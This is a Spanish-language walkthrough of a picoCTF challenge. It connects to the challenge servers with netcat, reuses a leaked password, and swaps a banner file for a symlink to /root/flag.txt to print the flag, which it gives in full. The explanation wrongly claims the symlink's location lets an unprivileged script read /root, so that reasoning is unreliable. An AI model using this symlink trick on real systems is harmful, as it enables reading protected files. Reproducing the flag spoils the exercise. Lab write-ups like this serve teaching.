## Descripción
```
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 63223`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 51754`. From the above information abuse the machine and find the flag in the /root directory.
```
## Solución
```
### Paso 1: Conectar al primer servidor y obtener la contraseña

bash

nc tethys.picoctf.net 63223

La contraseña filtrada es: `My_Passw@rd_@1234`

### Paso 2: Conectar al segundo servidor

bash

nc tethys.picoctf.net 51754

### Paso 3: Responder las preguntas

text

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
def con
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

### Paso 4: Una vez dentro, crear el enlace simbólico

bash

# Renombrar el banner original
mv banner banner_backup
# Crear enlace simbólico desde banner hacia flag.txt
ln -s /root/flag.txt banner

### Paso 5: Abrir una NUEVA conexión (segunda terminal)

En otra terminal, conectarse nuevamente al servidor:

bash

nc tethys.picoctf.net 49837

### Paso 6: Cuando script.py se ejecute, leerá el banner

Al conectarte por segunda vez, `script.py` se ejecutará automáticamente y leerá el archivo `banner`. Como ahora `banner` es un enlace simbólico a `/root/flag.txt`, mostrará el contenido de la bandera.

### Paso 7: Responder las preguntas nuevamente

En la segunda conexión, responde igual:

text

My_Passw@rd_@1234
def con
John Draper

### Paso 8: Obtener la bandera

El programa mostrará el banner (que ahora es la bandera) antes de hacer las preguntas. La bandera aparecerá en pantalla con formato `picoCTF{...}`

flag: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
```

## Notas 
```
## Explicación del exploit:

- `script.py` lee y muestra el contenido de `/home/player/banner` al inicio
    
- Al reemplazar `banner` con un enlace simbólico a `/root/flag.txt`, cuando el script lo lea, mostrará la bandera
    
- Esto funciona porque el script se ejecuta con privilegios de `player`, pero al leer a través del enlace simbólico, puede acceder al archivo en `/root` (ya que el enlace está en su directorio)
    
- Al conectarte nuevamente, el script se ejecuta automáticamente y muestra la bandera
```

## Referencias
````

```
